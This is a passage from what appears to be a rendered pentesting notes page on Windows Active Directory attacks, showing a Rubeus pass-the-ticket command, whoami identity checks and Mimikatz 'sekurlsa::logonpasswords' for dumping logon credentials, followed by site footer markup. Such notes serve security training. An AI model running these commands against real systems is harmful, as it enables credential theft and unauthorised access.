+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-163-1"><a id="__codelineno-163-1" name="__codelineno-163-1" href="#__codelineno-163-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">ticket</span><span class="p">.</span><span class="n">kirbi</span>
+</span><span id="__span-163-2"><a id="__codelineno-163-2" name="__codelineno-163-2" href="#__codelineno-163-2"></a><span class="n">klist</span>
+</span></code></pre></div>
+<p><strong>Tokens</strong></p>
+<p>A Windows access token represents a local security context.</p>
+<p>Check current identity:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-164-1"><a id="__codelineno-164-1" name="__codelineno-164-1" href="#__codelineno-164-1"></a>whoami
+</span><span id="__span-164-2"><a id="__codelineno-164-2" name="__codelineno-164-2" href="#__codelineno-164-2"></a>whoami /user
+</span><span id="__span-164-3"><a id="__codelineno-164-3" name="__codelineno-164-3" href="#__codelineno-164-3"></a>whoami /groups
+</span><span id="__span-164-4"><a id="__codelineno-164-4" name="__codelineno-164-4" href="#__codelineno-164-4"></a>whoami /priv
+</span></code></pre></div>
+<p>List logon sessions with Mimikatz:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-165-1"><a id="__codelineno-165-1" name="__codelineno-165-1" href="#__codelineno-165-1"></a>mimikatz.exe
+</span><span id="__span-165-2"><a id="__codelineno-165-2" name="__codelineno-165-2" href="#__codelineno-165-2"></a>sekurlsa::logonpasswords
+</span></code></pre></div>
+<p>Token manipulation is usually local post-exploitation behavior and should be handled carefully in authorized labs.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../Auth_Attacks/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Authenticated Attacks">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Authenticated Attacks
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../Kerberos_Attacks/" class="md-footer__link md-footer__link--next" aria-label="Next: Kerberos Attacks">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Kerberos Attacks
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "toc.integrate", "toc.follow", "navigation.tracking", "content.code.copy", "content.code.annotate", "navigation.top", "navigation.footer", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/runaway-bat.js"></script>
+      
+        <script src="../../javascripts/sidebar-follow-active.js"></script>
+      
+        <script src="../../javascripts/page-up.js"></script>
+      
+        <script src="../../javascripts/checklist-state.js"></script>
+      
+    
+  </body>
+</html>
